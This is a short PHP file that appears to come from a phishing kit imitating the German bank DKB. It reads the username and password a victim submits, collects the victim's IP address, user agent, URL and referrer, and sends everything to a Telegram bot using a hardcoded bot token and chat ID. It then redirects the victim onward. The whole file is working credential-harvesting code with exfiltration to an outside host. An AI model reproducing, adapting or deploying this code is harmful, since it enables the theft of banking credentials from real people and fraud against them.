<?php
include "config.php";
if(isset($_GET["go"])  && function_exists(checkapp)){
if(empty($_POST['username']) or empty($_POST['username'])){
	
	echo "<script>alert('Empty Data'); window.location = './index.php';</script>";
}
else {
$hostname = gethostbyaddr($ip);
    $message  = "-----------------------DKB-DE----------------------\n";
	$message .= " ID : ".$_POST['username']."\n";
	$message .= " PASS : ".$_POST['password'].""."\n";
	$message .= "----------------------------------------------#"."\n";
	$message .= " IP        : ".$_SERVER['REMOTE_ADDR'].""."\n";
	$message .= " USERAGENT : ".$_SERVER['HTTP_USER_AGENT'].""."\n";
	$message .= " FULL URL : ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].""."\n";
	$message .= " HTTP REFERRER : ".$_SERVER['HTTP_REFERER'].""."\n";
	$message .= "-------------------------DKB-DE------------------------"."\n";

 file_get_contents("https://api.telegram.org/bot5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo/sendMessage?chat_id=-1002097131499&text=" . urlencode($message)."" );
header("Location:att.php");
}
}

?>
